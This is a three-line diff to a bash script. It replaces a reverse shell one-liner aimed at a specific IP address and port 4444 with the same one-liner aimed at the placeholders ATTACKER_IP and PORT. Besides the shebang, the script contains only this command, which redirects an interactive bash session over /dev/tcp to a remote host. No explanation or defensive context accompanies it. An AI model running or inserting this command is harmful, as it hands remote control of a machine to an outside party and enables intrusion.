@@ -1,3 +1,3 @@
 #!/bin/bash
 
-bash -i >& /dev/tcp/10.207.0.103/4444 0>&1
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
